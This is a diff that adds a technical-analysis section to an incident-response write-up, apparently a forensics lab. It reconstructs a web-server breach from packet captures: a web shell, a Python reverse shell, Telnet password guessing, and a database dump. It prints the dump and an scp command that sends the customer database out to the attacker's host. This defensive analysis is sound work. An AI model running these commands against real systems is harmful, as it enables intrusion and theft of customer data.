@@ -94,6 +94,70 @@ DeviceNetworkEvents
 
 ---
 
+## Technical Analysis
+
+### Sitechecker Bot Crawler
+
+This tool was first utilized to crawl the premiumhouselight.com domain to “automatically discover and scan websites by following links from one webpage to another” (Sitechecker, 2023). It may have been used by the attacker for reconnaissance purposes, to gain insight into accessible URLs and identify potentially exploitable pages, such as hidden directories or admin panels.
+
+### Discovery of Uploads Directory and upload.php
+
+Multiple HTTP 404 (page not found) responses for requests to various directories on the web server are experienced in a very short period of time, likely indicating a directory brute-force attack to find hidden pages. 
+Through an HTTP 301(moved permanently) response on a request to the /uploads directory, the attacker IP 138.68.92.163 confirms the existence of a uploads directory, and now knows its new location according to this Wireshark capture: 
+In addition, the attacker also discovers “upload.php” in the root directory:
+
+Based on the HTML content, it is discovered that this is a form used for uploading files onto the web server. Given its name, it can be inferred that any files uploaded through its use would be sent to the server’s /uploads/ directory.
+
+### Remote Access to Web Server
+
+Shortly after, the attacker is met with a successful response for a request to the uploads directory:
+
+The screenshot shows the index of the /uploads/ directory, and reveals the existence of “shell.php” with a timestamp of 2022-02-20 01:54 (after conversion to UTC time). This likely indicates that this file was present within this directory even before the attacker infiltrated the server.
+
+Wireshark reveals the following information about the subsequent POST request targeting the shell.php file on the web server:
+
+This indicates that shell.php is a web shell and prompts the user to execute a command. In addition, the line-based text data relating to the POST request reveals an attempt to run a reverse shell command using Python, for the purposes of being able to initiate an outgoing connection with the attacker and “execute commands remotely on the [web server]”(Imperva, 2023). In this case, the web server is being set up to listen for IP 138.68.92.163 (the attacker) on port 4444, which is often used for eavesdropping and receiving data from compromised systems (SOCRadar, 2022). 
+
+### Discovery of Database and Open Port 22 and 23
+
+An ARP Ping Scan performed on the web server (now remotely accessed by the attacker), reveals the database IP and MAC address. 
+
+In addition, a TCP port scan was run which discovered that port 22 and 23 were open on the database; the presence of SYN, ACK packets observed on Wireshark confirms this. 
+By default, port 22 is dedicated to Secure Shell (SSH), which allows for secure connection to remote devices. Port 23 is the default port for Telnet, which also grants remote access to systems, however the data transmitted is not encrypted and is instead sent in plaintext (Fitzgibbons, 2023). 
+
+### Remote Access into the Database with Telnet
+
+Immediately after, the attacker utilizes Telnet to attempt to remotely access the database as demonstrated by the failed login attempts captured on Wireshark:
+
+Wireshark analysis of Telnet packets revealed that the attacker attempted 4 different username/password combinations to log in:
+- admin/admin
+- administrator/admin
+- phl/phl
+- phl/phl123 (successful)
+
+### Exfiltrating Customer Information from the Database
+
+Upon gaining access to the database, the attacker runs several commands on its shell:
+- **sudo -l** -
+This command shows the commands available to the phl user operating with superuser or root privileges
+
+In this screenshot, the attacker has access to two different commands: mysql and mysqldump. In both cases, they are able to run the command as root without requiring a password.
+
+- **sudo mysql -u root -p** -
+This command runs mysql to connect to the MySQL server as the root user, and prompts the attacker for a password. However, because they ran the command with superuser privileges, no password is required as explained in the previous screenshot.
+
+With access to the MySQL server, the attacker runs a number of different MySQL queries to investigate. In particular, they searched the “phl” database and discovered a table containing customer information:
+
+They then perform the query “SELECT * FROM customers” to view the table, revealing information about the company’s customer information:
+
+- **sudo mysqldump -u root -p phl > phl.db** - The attacker then runs this command to create a dump of the “phl” database containing the customer information into a file named “phl.db.” It is saved to the default directory.
+- **scp phl.db fierce@178.62.228.28:/tmp/phl.db** - This command utilizes secure copy to “securely copy files and directories between two locations” (Linuxize, 2023) using the SSH protocol.
+According to the command syntax, phl.db is the path of the source file located on the database, which is copied to the attacker’s (fierce@178.62.228.28) /tmp/ directory.
+The attacker is prompted for their password (fierce123) before transfer of data is conducted.
+
+
+---
+
 ## Chronological Event Timeline 
 
 ![Image](https://github.com/user-attachments/assets/73e09489-724e-4c9b-a384-3568e15ddd43)
